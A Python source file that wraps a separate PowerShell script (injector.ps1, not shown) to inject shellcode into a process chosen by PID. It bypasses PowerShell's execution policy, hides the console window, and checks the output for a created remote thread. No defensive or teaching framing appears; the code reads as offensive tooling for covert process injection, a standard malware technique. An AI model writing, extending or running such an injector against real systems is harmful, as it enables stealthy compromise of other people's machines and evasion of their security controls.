import os
import sys
import subprocess
import re
from dataclasses import dataclass


@dataclass
class InjectionResult:
    success: bool
    message: str
    error_code: int = 0


def inject_shellcode(pid: int) -> InjectionResult:
    # Locate the PowerShell script in the same directory as this Python file.
    # This keeps the Python code clean and delegates the API calls to a trusted format.
    script_dir = os.path.dirname(os.path.abspath(__file__))
    ps_script_path = os.path.join(script_dir, "injector.ps1")

    if not os.path.exists(ps_script_path):
        return InjectionResult(False, "injector.ps1 not found", -1)

    try:
        # Set up the PowerShell execution command
        cmd = [
            'powershell',
            '-NoProfile',
            '-ExecutionPolicy', 'Bypass',
            '-File', ps_script_path,
            '-targetPid', str(pid)
        ]
        
        # Hide the PowerShell console window on Windows
        creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
        
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            creationflags=creationflags
        )
        
        stdout, stderr = process.communicate(timeout=30)
        output = stdout + stderr

        # Check the output to determine if injection was successful
        if process.returncode == 0:
            if "remote thread has been created" in output.lower():
                return InjectionResult(True, "Remote thread created successfully", 0)
            else:
                return InjectionResult(False, "Injection may have failed", -1)
        else:
            # Extract the Windows API error code if present in the output
            error_match = re.search(r'error code:\s*(\d+)', output)
            if error_match:
                error_code = int(error_match.group(1))
                return InjectionResult(False, f"Injection failed (WinAPI error: {error_code})", error_code)
            else:
                return InjectionResult(False, f"Injection failed (PS exit code: {process.returncode})", -1)

    except subprocess.TimeoutExpired:
        return InjectionResult(False, "Injection timed out", -1)
    except Exception as e:
        return InjectionResult(False, f"Exception: {str(e)}", -1)